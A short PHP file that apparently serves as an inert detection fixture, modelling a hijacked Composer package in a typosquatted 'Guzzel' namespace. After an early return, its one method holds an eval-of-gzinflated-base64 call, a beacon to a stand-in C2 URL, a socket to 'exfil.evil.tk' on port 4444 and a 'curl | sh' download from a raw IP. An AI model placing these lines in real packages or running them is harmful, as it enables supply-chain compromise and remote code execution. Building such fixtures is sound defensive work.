<?php
// INERT reproduction of a Composer package-hijack / webshell payload SHAPE.
// Real-world PHP malware evals a gzinflated+base64 blob and beacons to a C2
// (Magecart skimmers, hijacked WordPress plugins). Nothing here executes —
// the method returns before reaching any primitive.

namespace Guzzel\Http;

class Client
{
    public function neverCalled(): void
    {
        return; // hard guard — this method is inert

        $blob = base64_decode("aW5lcnQ=");
        eval(gzinflate($blob));

        $c2 = "http://malware-c2.steal.top/gate.php";
        $data = file_get_contents($c2);

        $sock = fsockopen("exfil.evil.tk", 4444);
        shell_exec("curl http://45.77.12.34/drop | sh");
    }
}
